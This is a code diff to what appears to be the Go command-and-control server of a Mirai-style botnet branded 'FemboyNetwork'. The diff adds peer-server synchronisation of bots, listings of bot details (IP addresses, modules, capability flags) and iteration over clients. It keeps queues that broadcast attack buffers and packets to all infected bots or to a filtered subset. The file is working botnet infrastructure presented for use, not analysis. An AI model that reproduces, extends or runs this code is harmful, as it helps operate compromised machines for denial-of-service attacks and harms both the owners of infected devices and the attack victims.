@@ -1,10 +1,10 @@
 package main
 
 import (
-	"time"
+	"fmt"
 	"math/rand"
 	"sync"
-	"fmt"
+	"time"
 )
 
 type AttackSend struct {
@@ -20,34 +20,74 @@ type PktSend struct {
 	botCata string
 }
 
+type BotDetail struct {
+	Uid        int
+	Addr       string
+	Source     string
+	Version    string
+	Modules    []string
+	CapFlags   string
+	RemoteID   int
+}
+
+type remoteDelRequest struct {
+	uid    int
+	peerID int
+}
+
 type ClientList struct {
 	uid         int
 	count       int
 	clients     map[int]*Bot
 	addQueue    chan *Bot
 	delQueue    chan *Bot
+	remoteAdd   chan *Bot
+	remoteDel   chan *remoteDelRequest
 	atkQueue    chan *AttackSend
 	pktQueue    chan *PktSend
 	totalCount  chan int
 	cntView     chan int
 	distViewReq chan int
 	distViewRes chan map[string]int
+	detailsReq  chan int
+	detailsRes  chan []BotDetail
 	cntMutex    *sync.Mutex
+	forEachReq  chan *forEachRequest
+}
+
+type forEachRequest struct {
+	fn   func(*Bot)
+	done chan struct{}
 }
 
 func NewClientList() *ClientList {
-	c := &ClientList{0, 0, make(map[int]*Bot), make(chan *Bot, 128), make(chan *Bot, 128),
-		make(chan *AttackSend), make(chan *PktSend, 128),
-		make(chan int, 64), make(chan int), make(chan int), make(chan map[string]int), &sync.Mutex{}}
-	go c.worker()
-	go c.fastCountWorker()
-	return c
+	cl := &ClientList{
+		uid:         0,
+		count:       0,
+		clients:     make(map[int]*Bot),
+		addQueue:    make(chan *Bot, 128),
+		delQueue:    make(chan *Bot, 128),
+		remoteAdd:   make(chan *Bot, 128),
+		remoteDel:   make(chan *remoteDelRequest, 128),
+		atkQueue:    make(chan *AttackSend, 128),
+		pktQueue:    make(chan *PktSend, 128),
+		totalCount:  make(chan int, 64),
+		cntView:     make(chan int),
+		distViewReq: make(chan int),
+		distViewRes: make(chan map[string]int),
+		detailsReq:  make(chan int),
+		detailsRes:  make(chan []BotDetail),
+		cntMutex:    &sync.Mutex{},
+		forEachReq:  make(chan *forEachRequest, 64),
+	}
+	go cl.worker()
+	go cl.fastCountWorker()
+	return cl
 }
 
 func (this *ClientList) Count() int {
 	this.cntMutex.Lock()
 	defer this.cntMutex.Unlock()
-
 	this.cntView <- 0
 	return <-this.cntView
 }
@@ -60,7 +100,6 @@ func (this *ClientList) Distribution() map[string]int {
 }
 
 func (this *ClientList) GetBotInfo(index int) (string, string, string) {
-	// returns (ip, source, version) for bot at position index, or empty if not found
 	for _, v := range this.clients {
 		if v.uid == index {
 			return v.conn.RemoteAddr().String(), v.source, fmt.Sprintf("%d", v.version)
@@ -69,27 +108,45 @@ func (this *ClientList) GetBotInfo(index int) (string, string, string) {
 	return "", "", ""
 }
 
+func (this *ClientList) BotDetails() []BotDetail {
+	this.cntMutex.Lock()
+	defer this.cntMutex.Unlock()
+	this.detailsReq <- 0
+	return <-this.detailsRes
+}
+
 func (this *ClientList) BotCount() int {
-	// requires cntMutex + totalCount to be accurate, or use Count()
 	return this.count
 }
 
 func (this *ClientList) AddClient(c *Bot) {
 	this.addQueue <- c
-	fmt.Printf("\033[1;91m[\033[0;91mFemboyNetwork\033[1;91m]\033[0;97m Bot \033[1;91m[\033[0;97m%s\033[1;91m]\033[0;97m %s\033[1;91m]\n", c.conn.RemoteAddr(), c.source)
 }
 
 func (this *ClientList) DelClient(c *Bot) {
 	this.delQueue <- c
 }
 
+func (this *ClientList) AddRemote(bot *Bot) {
+	this.remoteAdd <- bot
+}
+
+func (this *ClientList) DelRemote(uid, peerID int) {
+	this.remoteDel <- &remoteDelRequest{uid: uid, peerID: peerID}
+}
+
 func (this *ClientList) QueueBuf(buf []byte, maxbots int, botCata string) {
-	attack := &AttackSend{buf, maxbots, botCata}
-	this.atkQueue <- attack
+	this.atkQueue <- &AttackSend{buf, maxbots, botCata}
 }
 
 func (this *ClientList) QueuePkt(pktType uint8, payload []byte, maxbots int, botCata string) {
 	this.pktQueue <- &PktSend{pktType, payload, maxbots, botCata}
+}
+
+func (this *ClientList) ForEachClient(fn func(*Bot)) {
+	req := &forEachRequest{fn: fn, done: make(chan struct{})}
+	this.forEachReq <- req
+	<-req.done
 }
 
 func (this *ClientList) fastCountWorker() {
@@ -97,17 +154,14 @@ func (this *ClientList) fastCountWorker() {
 		select {
 		case delta := <-this.totalCount:
 			this.count += delta
-			break
 		case <-this.cntView:
 			this.cntView <- this.count
-			break
 		}
 	}
 }
 
 func (this *ClientList) worker() {
 	rand.Seed(time.Now().UTC().UnixNano())
-
 	for {
 		select {
 		case add := <-this.addQueue:
@@ -115,17 +169,37 @@ func (this *ClientList) worker() {
 			this.uid++
 			add.uid = this.uid
 			this.clients[add.uid] = add
-			break
+			if peerMgr != nil && !add.isDns && add.remoteID == 0 {
+				peerMgr.BroadcastBotJoin(add)
+			}
 		case del := <-this.delQueue:
 			this.totalCount <- -1
+			if peerMgr != nil && del.remoteID == 0 {
+				peerMgr.BroadcastBotLeave(del)
+			}
 			delete(this.clients, del.uid)
-			break
+		case bot := <-this.remoteAdd:
+			this.totalCount <- 1
+			this.uid++
+			bot.uid = this.uid
+			bot.conn = nil // remote bots have no local connection
+			this.clients[bot.uid] = bot
+		case req := <-this.remoteDel:
+			for uid, bot := range this.clients {
+				if bot.remoteID == req.peerID && (req.uid == 0 || bot.remoteUID == req.uid) {
+					this.totalCount <- -1
+					delete(this.clients, uid)
+					break
+				}
+			}
 		case atk := <-this.atkQueue:
 			sent := 0
 			if atk.count == -1 {
 				for _, v := range this.clients {
 					if atk.botCata == "" || atk.botCata == v.source {
-						v.QueueBuf(atk.buf)
+						if v.conn != nil {
+							v.QueueBuf(atk.buf)
+						}
 						sent++
 					}
 				}
@@ -136,22 +210,22 @@ func (this *ClientList) worker() {
 						break
 					}
 					if atk.botCata == "" || atk.botCata == v.source {
-						v.QueueBuf(atk.buf)
+						if v.conn != nil {
+							v.QueueBuf(atk.buf)
+						}
 						count++
 						sent++
 					}
 				}
 			}
-			if debugMode {
-				fmt.Printf("[cnc] attack queued: sent=%d maxbots=%d filter=%q total=%d\n", sent, atk.count, atk.botCata, this.count)
-			}
-			break
 		case pkt := <-this.pktQueue:
 			sent := 0
 			if pkt.count == -1 {
 				for _, v := range this.clients {
 					if pkt.botCata == "" || pkt.botCata == v.source {
-						v.SendPkt(pkt.pktType, pkt.payload)
+						if v.conn != nil {
+							v.SendPkt(pkt.pktType, pkt.payload)
+						}
 						sent++
 					}
 				}
@@ -162,29 +236,45 @@ func (this *ClientList) worker() {
 						break
 					}
 					if pkt.botCata == "" || pkt.botCata == v.source {
-						v.SendPkt(pkt.pktType, pkt.payload)
+						if v.conn != nil {
+							v.SendPkt(pkt.pktType, pkt.payload)
+						}
 						count++
 						sent++
 					}
 				}
 			}
-			if debugMode {
-				fmt.Printf("[cnc] pkt queued: type=%d sent=%d total=%d\n", pkt.pktType, sent, this.count)
-			}
-			break
 		case <-this.cntView:
 			this.cntView <- this.count
-			break
 		case <-this.distViewReq:
 			res := make(map[string]int)
 			for _, v := range this.clients {
-				if ok, _ := res[v.source]; ok > 0 {
-					res[v.source]++
-				} else {
-					res[v.source] = 1
-				}
+				res[v.source]++
 			}
 			this.distViewRes <- res
+		case <-this.detailsReq:
+			var res []BotDetail
+			for _, v := range this.clients {
+				addr := ""
+				if v.conn != nil {
+					addr = v.conn.RemoteAddr().String()
+				}
+				res = append(res, BotDetail{
+					Uid:      v.uid,
+					Addr:     addr,
+					Source:   v.source,
+					Version:  v.versionStr,
+					Modules:  v.modules,
+					CapFlags: v.capFlags,
+					RemoteID: v.remoteID,
+				})
+			}
+			this.detailsRes <- res
+		case req := <-this.forEachReq:
+			for _, v := range this.clients {
+				req.fn(v)
+			}
+			close(req.done)
 		}
 	}
 }
